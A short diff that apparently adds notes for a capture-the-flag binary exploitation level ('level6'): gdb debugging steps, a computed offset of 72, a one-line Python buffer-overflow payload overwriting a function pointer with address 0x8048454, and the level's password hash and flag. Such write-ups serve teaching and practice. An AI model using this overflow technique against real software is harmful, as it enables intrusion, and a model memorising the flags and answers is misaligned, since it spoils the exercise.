@@ -1,0 +1,11 @@
+level6 : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+Process:
+    - ./level6 --> segfault
+    - ./level6 dsadsads --> nope
+    - gdb ./level6
+    - run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.. --> segfault
+    - p n --> get adress n function --> 0x8048454
+    - run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJIIIIKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ --> 0x53535353
+    - offset = 72
+    - ./level6 $(python -c 'print("A"*72 + "\x54\x84\x04\x08")')
+    - get the flag : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
